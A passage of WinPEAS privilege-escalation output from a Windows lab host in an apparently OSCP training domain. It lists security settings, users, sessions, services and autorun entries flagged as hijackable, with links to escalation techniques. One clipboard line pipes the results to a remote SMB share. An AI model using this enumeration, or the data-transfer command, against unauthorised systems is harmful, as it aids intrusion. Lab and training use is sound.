  The system is inside a domain (OSCP) so it could be vulnerable.
╚ You can try https://github.com/Dec0ne/KrbRelayUp to escalate privileges

╔══════════╣ Checking If Inside Container
╚ If the binary cexecsvc.exe or associated service exists, you are inside Docker 
You are NOT inside a container

╔══════════╣ Checking AlwaysInstallElevated
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated
    AlwaysInstallElevated isn't available

╔══════════╣ Enumerate LSA settings - auth packages included

    auditbasedirectories                 :       0
    auditbaseobjects                     :       0
    Bounds                               :       00-30-00-00-00-20-00-00
    crashonauditfail                     :       0
    fullprivilegeauditing                :       00
    LimitBlankPasswordUse                :       1
    NoLmHash                             :       1
    Security Packages                    :       ""
    Notification Packages                :       rassfm,scecli
    Authentication Packages              :       msv1_0
    LsaPid                               :       644
    LsaCfgFlagsDefault                   :       0
    SecureBoot                           :       1
    ProductType                          :       7
    disabledomaincreds                   :       0
    everyoneincludesanonymous            :       0
    forceguest                           :       0
    restrictanonymous                    :       0
    restrictanonymoussam                 :       1
    SCENoApplyLegacyAuditPolicy          :       0
    TurnOffAnonymousBlock                :       0
    LsaConfigFlags                       :       0
    RunAsPPL                             :       0
    RunAsPPLBoot                         :       0

╔══════════╣ Enumerating NTLM Settings
  LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)


  NTLM Signing Settings
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : False
      ServerNegotiateSigning  : False
      LdapSigning             : Negotiate signing (Negotiate signing)

  Session Security
      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)


  NTLM Auditing and Restrictions
      InboundRestrictions     :  (Not defined)
      OutboundRestrictions    :  (Not defined)
      InboundAuditing         :  (Not defined)
      OutboundExceptions      : 

╔══════════╣ Display Local Group Policy settings - local users/machine
   Type             :     user
   Display Name     :     Local Group Policy
   Name             :     Local Group Policy
   Extensions       :     [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F73-3407-48AE-BA88-E8213C6761F1}]
   File Sys Path    :     C:\Windows\System32\GroupPolicy\User
   Link             :     Local
   GPO Link         :     Local Machine
   Options          :     All Sections Enabled

   =================================================================================================


╔══════════╣ Potential GPO abuse vectors (applied domain GPOs writable by current user)
    No obvious GPO abuse via writable SYSVOL paths or GPCO membership detected.

╔══════════╣ Checking AppLocker effective policy
   AppLockerPolicy version: 1
   listing rules:



╔══════════╣ Enumerating Printers (WMI)

╔══════════╣ Enumerating Named Pipes
  Name                                                                                                 CurrentUserPerms                                                       Sddl

  eventlog                                                                                             Everyone [Allow: WriteData/CreateFiles]                                O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)

  ROUTER                                                                                               Everyone [Allow: WriteData/CreateFiles]                                O:SYG:SYD:P(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;SY)

  sql\query                                                                                            Everyone [Allow: WriteData/CreateFiles]                                O:S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003G:S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003D:(A;;0x12019b;;;WD)(A;;LC;;;S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003)

  SQLLocal\MSSQLSERVER                                                                                 Everyone [Allow: WriteData/CreateFiles]                                O:S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003G:S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003D:(A;;0x12019b;;;WD)(A;;LC;;;S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003)

  vgauth-service                                                                                       Everyone [Allow: WriteData/CreateFiles]                                O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)


╔══════════╣ Enumerating AMSI registered providers

╔══════════╣ Enumerating Sysmon configuration
      You must be an administrator to run this check

╔══════════╣ Enumerating Sysmon process creation logs (1)
      You must be an administrator to run this check

╔══════════╣ Installed .NET versions

  CLR Versions
   4.0.30319

  .NET Versions
   4.7.03190

  .NET & AMSI (Anti-Malware Scan Interface) support
      .NET version supports AMSI     : False
      OS supports AMSI               : True


════════════════════════════════════╣ Interesting Events information ╠════════════════════════════════════

╔══════════╣ Printing Explicit Credential Events (4648) for last 30 days - A process logged on using plaintext credentials

      You must be an administrator to run this check

╔══════════╣ Printing Account Logon Events (4624) for the last 10 days.

      You must be an administrator to run this check

╔══════════╣ Process creation events - searching logs (EID 4688) for sensitive data.

      You must be an administrator to run this check

╔══════════╣ PowerShell events - script block logs (EID 4104) - searching for sensitive data.

   User Id         :        S-1-5-21-318536300-2164503644-2098472648-500
   Event Id        :        4104
   Context         :        Write-CWarningOnce -Message ('You passed a plain text password to `Initialize-CLcm`. A future version of Carbon will remove support for plain-text passwords. Please pass a `SecureString` instead.')
{
if( $CertPassword -and $CertPassword -isnot [securestring] )
ConvertTo-SecureString -String $CertPassword -AsPlainText -Force
}
$thumbprint = $null
if( $CertificateID )
   Created At      :        10/9/2024 1:55:57 PM
   Command line    :        ConvertTo-SecureString -String $CertPassword -AsPlainText -Force


   =================================================================================================

   User Id         :        S-1-5-21-318536300-2164503644-2098472648-500
   Event Id        :        4104
   Context         :        Write-CWarningOnce -Message ('You passed a plain text password to `Install-CCertificate`. A future version of Carbon will remove support for plain-text passwords. Please pass a `SecureString` instead.')
{
if( $Password -and $Password -isnot [securestring] )
ConvertTo-SecureString -String $Password -AsPlainText -Force
}
if( $PSCmdlet.ParameterSetName -like 'FromFile*' )
{
   Created At      :        10/9/2024 1:55:57 PM
   Command line    :        ConvertTo-SecureString -String $Password -AsPlainText -Force


   =================================================================================================

   User Id         :        S-1-5-21-318536300-2164503644-2098472648-500
   Event Id        :        4104
   Context         :        .DESCRIPTION
Removes users or groups from a *local* group.
.SYNOPSIS
net localgroup`, but that won't accept user/group names longer than 24 characters.  This means you have to use the .NET Directory Services APIs.  How do you reliably remove both users *and* groups?  What if those users are in a domain?  What if they're in another domain?  What about built-in users?  Fortunately, your brain hasn't exploded.
So, this function removes users or groups from a *local* group.
If the user or group is not a member, nothing happens.
`Remove-CGroupMember` is new in Carbon 2.0.
   Created At      :        10/9/2024 1:55:57 PM
   Command line    :        net localgroup`, but that won't accept user/group names longer than 24 characters.  This means you have to use the .NET Directory Services APIs.  How do you reliably remove both users *and* groups?  What if those users are in a domain?  What if they're in another domain?  What about built-in users?  Fortunately, your brain hasn't exploded.


   =================================================================================================

   User Id         :        S-1-5-21-318536300-2164503644-2098472648-500
   Event Id        :        4104
   Context         :        {
if( $Password -is [string] )
{
ConvertTo-SecureString -AsPlainText -Force -String $Password
}
elseif( $Password -isnot [securestring] )
{
   Created At      :        10/9/2024 1:55:57 PM
   Command line    :        ConvertTo-SecureString -AsPlainText -Force -String $Password


   =================================================================================================

   User Id         :        S-1-5-21-318536300-2164503644-2098472648-500
   Event Id        :        4104
   Context         :        {
if( $PSCmdlet.ParameterSetName -like 'CustomAccount*' -and -not $Credential )
{
net.microsoft.com/en-us/library/dd548356.aspx.)  If not, please use the `Credential` parameter to pass the account''s credentials.' -f $Name,$UserName)
}
else
{
   Created At      :        10/9/2024 1:55:57 PM
   Command line    :        net.microsoft.com/en-us/library/dd548356.aspx.)  If not, please use the `Credential` parameter to pass the account''s credentials.' -f $Name,$UserName)


   =================================================================================================

   User Id         :        S-1-5-21-318536300-2164503644-2098472648-500
   Event Id        :        4104
   Context         :        .DESCRIPTION
Gets the IP addresses in use on the local computer.
.SYNOPSIS
network intefaces is pretty cumbersome.  If all you care about is getting the IP addresses in use on the current computer, and you don't care where/how they're used, use this function.
If you *do* care about network interfaces, then you'll have to do it yourself using the [System.Net.NetworkInformation.NetworkInterface](http://msdn.microsoft.com/en-us/library/System.Net.NetworkInformation.NetworkInterface.aspx) class's [GetAllNetworkInterfaces](http://msdn.microsoft.com/en-us/library/system.net.networkinformation.networkinterface.getallnetworkinterfaces.aspx) static method, e.g.
[Net.NetworkInformation.NetworkInterface]::GetNetworkInterfaces()
.LINK
   Created At      :        10/9/2024 1:55:57 PM
   Command line    :        network intefaces is pretty cumbersome.  If all you care about is getting the IP addresses in use on the current computer, and you don't care where/how they're used, use this function.


   =================================================================================================

   User Id         :        S-1-5-21-318536300-2164503644-2098472648-500
   Event Id        :        4104
   Context         :        .DESCRIPTION
Adds a users or groups to a *local* group.
.SYNOPSIS
net localgroup`, but that won't accept user/group names longer than 24 characters.  This means you have to use the .NET Directory Services APIs.  How do you reliably add both users *and* groups?  What if those users are in a domain?  What if they're in another domain?  What about built-in users?  Fortunately, you're brain hasn't exploded.
So, this function adds users and groups to a *local* group.
If the members are already part of the group, nothing happens.
The user running this function must have access to the directory where each principal in the `Member` parameter and the directory where each of the group's current members are located.
   Created At      :        10/9/2024 1:55:57 PM
   Command line    :        net localgroup`, but that won't accept user/group names longer than 24 characters.  This means you have to use the .NET Directory Services APIs.  How do you reliably add both users *and* groups?  What if those users are in a domain?  What if they're in another domain?  What about built-in users?  Fortunately, you're brain hasn't exploded.


   =================================================================================================


╔══════════╣ Displaying Power off/on events for last 5 days



════════════════════════════════════╣ Users Information ╠════════════════════════════════════

╔══════════╣ Users
╚ Check if you have some admin equivalent privileges https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#users--groups
  Current user: b.martin
  Current groups: Domain Users, Everyone, Builtin\Remote Desktop Users, Users, Remote Interactive Logon, Interactive, Authenticated Users, This Organization, Local, Travel Agents, Authentication authority asserted identity
   =================================================================================================

    SRV22\Administrator: Built-in account for administering the computer/domain
        |->Groups: Administrators
        |->Password: CanChange-NotExpi-Req

    SRV22\DefaultAccount(Disabled): A user account managed by the system.
        |->Groups: System Managed Accounts Group
        |->Password: CanChange-NotExpi-NotReq

    SRV22\Guest(Disabled): Built-in account for guest access to the computer/domain
        |->Groups: Guests
        |->Password: NotChange-NotExpi-NotReq

    SRV22\jenkins
        |->Groups: Users
        |->Password: CanChange-NotExpi-Req

    SRV22\WDAGUtilityAccount(Disabled): A user account managed and used by the system for Windows Defender Application Guard scenarios.
        |->Password: CanChange-NotExpi-Req


╔══════════╣ Current User Idle Time
   Current User   :     OSCP\b.martin
   Idle Time      :     00h:00m:03s:031ms

╔══════════╣ Display Tenant information (DsRegCmd.exe /status)
   Tenant is NOT Azure AD Joined.

╔══════════╣ Current Token privileges
╚ Check if you can escalate privilege using some enabled token https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#token-manipulation
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED

╔══════════╣ Clipboard text
.\winPEASx64.exe | Tee-Object -FilePath \\172.16.104.206\Transfer\peas_result.txt

╔══════════╣ Logged users
    NT SERVICE\MSSQLSERVER
    NT SERVICE\SQLSERVERAGENT
    NT SERVICE\SQLTELEMETRY
    SRV22\jenkins
    OSCP\b.martin

╔══════════╣ Display information about local users
   Computer Name           :   SRV22
   User Name               :   Administrator
   User Id                 :   500
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   Built-in account for administering the computer/domain
   Last Logon              :   2/22/2026 5:30:11 AM
   Logons Count            :   33
   Password Last Set       :   10/9/2024 10:39:03 AM

   =================================================================================================

   Computer Name           :   SRV22
   User Name               :   DefaultAccount
   User Id                 :   503
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   A user account managed by the system.
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   SRV22
   User Name               :   Guest
   User Id                 :   501
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   Built-in account for guest access to the computer/domain
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   SRV22
   User Name               :   jenkins
   User Id                 :   1001
   Is Enabled              :   True
   User Type               :   User
   Comment                 :   
   Last Logon              :   11/11/2024 10:28:34 AM
   Logons Count            :   9
   Password Last Set       :   10/9/2024 12:54:28 PM

   =================================================================================================

   Computer Name           :   SRV22
   User Name               :   WDAGUtilityAccount
   User Id                 :   504
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   A user account managed and used by the system for Windows Defender Application Guard scenarios.
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   10/9/2024 2:16:19 PM

   =================================================================================================


╔══════════╣ RDP Sessions
    SessID    pSessionName   pUserName      pDomainName              State     SourceIP
    2         RDP-Tcp#2      b.martin       OSCP                     Active    192.168.238.128

╔══════════╣ Ever logged users
    NT SERVICE\MSSQLSERVER
    NT SERVICE\SQLSERVERAGENT
    NT SERVICE\SQLTELEMETRY
    SRV22\Administrator
    SRV22\jenkins
    OSCP\b.martin

╔══════════╣ Home folders found
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\b.martin : b.martin [Allow: AllAccess]
    C:\Users\Default
    C:\Users\Default User
    C:\Users\jenkins
    C:\Users\Public : Interactive [Allow: WriteData/CreateFiles]

╔══════════╣ Looking for AutoLogon credentials
    Not Found

╔══════════╣ Password Policies
╚ Check for a possible brute-force 
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: 0
   =================================================================================================

    Domain: SRV22
    SID: S-1-5-21-318536300-2164503644-2098472648
    MaxPasswordAge: 42.00:00:00
    MinPasswordAge: 1.00:00:00
    MinPasswordLength: 7
    PasswordHistoryLength: 24
    PasswordProperties: 0
   =================================================================================================


╔══════════╣ Print Logon Sessions
    Method:                       WMI
    Logon Server:                 
    Logon Server Dns Domain:      
    Logon Id:                     1179383
    Logon Time:                   
    Logon Type:                   0
    Start Time:                   12/31/1600 4:00:00 PM
    Domain:                       OSCP
    Authentication Package:       
    Start Time:                   12/31/1600 4:00:00 PM
    User Name:                    b.martin
    User Principal Name:          
    User SID:                     

   =================================================================================================

    Method:                       WMI
    Logon Server:                 
    Logon Server Dns Domain:      
    Logon Id:                     2003360
    Logon Time:                   
    Logon Type:                   Network
    Start Time:                   2/22/2026 5:43:39 AM
    Domain:                       OSCP
    Authentication Package:       NTLM
    Start Time:                   2/22/2026 5:43:39 AM
    User Name:                    b.martin
    User Principal Name:          
    User SID:                     

   =================================================================================================



════════════════════════════════════╣ Processes Information ╠════════════════════════════════════

╔══════════╣ Interesting Processes -non Microsoft-
╚ Check if any interesting processes for memory dump or if you could overwrite some binary running https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#running-processes
    conhost(5300)[C:\Windows\system32\conhost.exe] -- POwn: b.martin
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================

    svchost(5084)[C:\Windows\system32\svchost.exe] -- POwn: b.martin
    Command Line: C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s CDPUserSvc
   =================================================================================================

    RuntimeBroker(1896)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: b.martin
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    sihost(1368)[C:\Windows\system32\sihost.exe] -- POwn: b.martin
    Command Line: sihost.exe
   =================================================================================================

    svchost(7000)[C:\Windows\System32\svchost.exe] -- POwn: b.martin
    Command Line: C:\Windows\System32\svchost.exe -k UnistackSvcGroup
   =================================================================================================

    SearchUI(6312)[C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe] -- POwn: b.martin
    Command Line: "C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca
   =================================================================================================

    taskhostw(2876)[C:\Windows\system32\taskhostw.exe] -- POwn: b.martin
    Command Line: taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
   =================================================================================================

    powershell(5244)[C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe] -- POwn: b.martin
    Command Line: "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" 
   =================================================================================================

    RuntimeBroker(6412)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: b.martin
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    ShellExperienceHost(6212)[C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe] -- POwn: b.martin
    Command Line: "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca
   =================================================================================================

    RuntimeBroker(6320)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: b.martin
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    rdpclip(1628)[C:\Windows\System32\rdpclip.exe] -- POwn: b.martin
    Command Line: rdpclip
   =================================================================================================

    notepad(3004)[C:\Windows\system32\notepad.exe] -- POwn: b.martin
    Command Line: "C:\Windows\system32\notepad.exe" 
   =================================================================================================

    explorer(5552)[C:\Windows\Explorer.EXE] -- POwn: b.martin
    Command Line: C:\Windows\Explorer.EXE
   =================================================================================================

    svchost(2180)[C:\Windows\system32\svchost.exe] -- POwn: b.martin
    Command Line: C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s WpnUserService
   =================================================================================================

    notepad(3768)[C:\Windows\system32\notepad.exe] -- POwn: b.martin
    Command Line: "C:\Windows\system32\notepad.exe" 
   =================================================================================================

    ImeBroker(6944)[C:\Windows\System32\IME\SHARED\imebroker.exe] -- POwn: b.martin
    Command Line: C:\Windows\System32\IME\SHARED\imebroker.exe -Embedding
   =================================================================================================

    WinPEASx64(6872)[C:\Users\b.martin\WinPEASx64.exe] -- POwn: b.martin -- isDotNet
    Permissions: b.martin [Allow: AllAccess]
    Possible DLL Hijacking folder: C:\Users\b.martin (b.martin [Allow: AllAccess])
    Command Line: "C:\Users\b.martin\WinPEASx64.exe"
   =================================================================================================


╔══════════╣ Vulnerable Leaked Handlers
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#leaked-handlers
╚ Getting Leaked Handlers, it might take some time...
[#######---]  76% |#--]  85% /#-]  90% -7% \                       Handle: 2204(key)
    Handle Owner: Pid is 6872(WinPEASx64) with owner: b.martin
    Reason: TakeOwnership
    Registry: HKLM\software\microsoft\fusion\publisherpolicy\default
   =================================================================================================

    Handle: 2444(key)
    Handle Owner: Pid is 6872(WinPEASx64) with owner: b.martin
    Reason: TakeOwnership
    Registry: HKLM\software\microsoft\internet explorer\main\featurecontrol
   =================================================================================================

    Handle: 2536(key)
    Handle Owner: Pid is 6872(WinPEASx64) with owner: b.martin
    Reason: AllAccess
    Registry: HKLM\software\policies\microsoft\windows\currentversion\internet settings
   =================================================================================================



════════════════════════════════════╣ Services Information ╠════════════════════════════════════

╔══════════╣ Interesting Services -non Microsoft-
╚ Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services
    Jenkins(Jenkins)["C:\Program Files\Jenkins\jenkins.exe"] - Auto - Running
    Jenkins Automation Server
   =================================================================================================

    Sense(Sense)["C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"] - Manual - Stopped
   =================================================================================================

    ssh-agent(OpenSSH Authentication Agent)[C:\Windows\System32\OpenSSH\ssh-agent.exe] - Disabled - Stopped
    Agent to hold private keys used for public key authentication.
   =================================================================================================

    VGAuthService(VMware, Inc. - VMware Alias Manager and Ticket Service)["C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"] - Auto - Running
    Alias Manager and Ticket Service
   =================================================================================================

    VM3DService(VMware, Inc. - VMware SVGA Helper Service)[C:\Windows\system32\vm3dservice.exe] - Auto - Running
    Helps VMware SVGA driver by collecting and conveying user mode information
   =================================================================================================

    VMTools(VMware, Inc. - VMware Tools)["C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"] - Auto - Running
    Provides support for synchronizing objects between the host and guest operating systems.
   =================================================================================================


╔══════════╣ Modifiable Services
╚ Check if you can modify any service https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services
    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
    RmSvc: GenericExecute (Start/Stop)
    ConsentUxUserSvc_13ac89: GenericExecute (Start/Stop)
    DevicePickerUserSvc_13ac89: GenericExecute (Start/Stop)
    DevicesFlowUserSvc_13ac89: GenericExecute (Start/Stop)
    PimIndexMaintenanceSvc_13ac89: GenericExecute (Start/Stop)
    PrintWorkflowUserSvc_13ac89: GenericExecute (Start/Stop)
    UnistoreSvc_13ac89: GenericExecute (Start/Stop)
    UserDataSvc_13ac89: GenericExecute (Start/Stop)
    WpnUserService_13ac89: GenericExecute (Start/Stop)

╔══════════╣ Looking if you can modify any service registry
╚ Check if you can modify the registry of a service https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services-registry-modify-permissions
    [-] Looks like you cannot change the registry of any service...

╔══════════╣ Checking write permissions in PATH folders (DLL Hijacking)
╚ Check for DLL Hijacking in PATH folders https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dll-hijacking
    C:\Program Files\Common Files\Oracle\Java\javapath
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\
    C:\Windows\System32\OpenSSH\
    C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\
    C:\Program Files (x86)\Microsoft SQL Server\150\Tools\Binn\
    C:\Program Files\Microsoft SQL Server\150\Tools\Binn\
    C:\Program Files\Microsoft SQL Server\150\DTS\Binn\


════════════════════════════════════╣ Applications Information ╠════════════════════════════════════

╔══════════╣ Current Active Window Application
    Windows PowerShell

╔══════════╣ Installed Applications --Via Program Files/Uninstall registry--
╚ Check if you can modify installed software https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#applications
    C:\Program Files\Common Files
    C:\Program Files\desktop.ini
    C:\Program Files\internet explorer
    C:\Program Files\Java
    C:\Program Files\Jenkins
    C:\Program Files\Microsoft
    C:\Program Files\Microsoft SQL Server
    C:\Program Files\Microsoft Visual Studio 10.0
    C:\Program Files\Microsoft.NET
    C:\Program Files\msedge_installer.log
    C:\Program Files\MsEdgeCrashpad
    C:\Program Files\PackageManagement
    C:\Program Files\Uninstall Information
    C:\Program Files\VMware
    C:\Program Files\Windows Defender
    C:\Program Files\Windows Mail
    C:\Program Files\Windows Media Player
    C:\Program Files\Windows Multimedia Platform
    C:\Program Files\windows nt
    C:\Program Files\Windows Photo Viewer
    C:\Program Files\Windows Portable Devices
    C:\Program Files\Windows Security
    C:\Program Files\Windows Sidebar
    C:\Program Files\WindowsApps
    C:\Program Files\WindowsPowerShell


╔══════════╣ Autorun Applications
╚ Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html

    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: VMware User Process
    Folder: C:\Program Files\VMware\VMware Tools
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected) - C:\
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Userinit
    Folder: C:\Windows\system32
    File: C:\Windows\system32\userinit.exe,
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Shell
    Folder: None (PATH Injection)
    File: explorer.exe
   =================================================================================================


    RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
    Key: AlternateShell
    Folder: None (PATH Injection)
    File: cmd.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.l3acm
    Folder: C:\Windows\System32
    File: C:\Windows\System32\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.l3acm
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.cvid
    Folder: None (PATH Injection)
    File: iccvid.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
